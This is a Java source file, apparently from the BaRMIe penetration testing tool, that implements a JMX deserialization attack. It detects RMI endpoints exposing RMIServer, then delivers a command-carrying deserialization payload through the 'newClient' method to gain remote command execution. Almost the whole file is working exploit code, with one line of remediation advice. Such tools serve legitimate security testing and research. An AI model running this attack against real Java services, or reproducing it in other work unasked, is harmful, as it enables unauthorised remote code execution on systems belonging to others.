package nb.barmie.modes.attack.attacks.Java;

import javax.management.remote.rmi.RMIServer;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.modes.attack.DeserPayload;
import nb.barmie.modes.attack.RMIDeserAttack;
import nb.barmie.modes.enumeration.RMIEndpoint;

/***********************************************************
 * Deliver a deserialization payload to a JMX RMI service,
 * via the Object-type parameter to the 'newClient'
 * method.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class JMXDeser extends RMIDeserAttack {
	/*******************
	 * Set attack properties.
	 ******************/
	public JMXDeser() {
		super();
		this.setDescription("JMX Deserialization");
		this.setDetailedDescription("JMX uses an RMI service which exposes an object of type RMIServerImpl_Stub. The 'newClient' method accepts an arbitrary Object as a parameter, enabling deserialization attacks.");
		this.setRemediationAdvice("[JMX] Update Java to the latest available version");
		this.setAppSpecific(false);
	}
	
	/*******************
	 * Check if the given endpoint can be attacked.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 * @return True if we can attack it.
	 ******************/
	public boolean canAttackEndpoint(RMIEndpoint ep) {
		return ep.hasClass("javax.management.remote.rmi.RMIServerImpl_Stub") || ep.hasClass("javax.management.remote.rmi.RMIServer");
	}
	
	/*******************
	 * Execute the deserialization attack against the given RMI endpoint using
	 * the given payload.
	 * 
	 * @param ep The enumerated RMI endpoint.
	 * @param payload The deserialization payload to deliver.
	 * @param cmd The command to use for payload generation.
	 ******************/
	public void executeAttack(RMIEndpoint ep, DeserPayload payload, String cmd) throws BaRMIeException {
		RMIServer obj;
		
		//Launch the attack
		try {
			//Get the fully proxied target object
			System.out.println("\n[~] Getting proxied jmxrmi object...");
			obj = (RMIServer)this.getProxiedObject(ep, "jmxrmi", payload.getBytes(cmd, 0));
			
			//Call the newClient() method, passing in the default payload marker
			System.out.println("[+] Retrieved, invoking newClient(PAYLOAD)...");
			obj.newClient(this.DEFAULT_MARKER_OBJECT);
		} catch(Exception ex) {
			//Check the exception for useful info
			this.checkDeserException(ex);
		}
	}
}
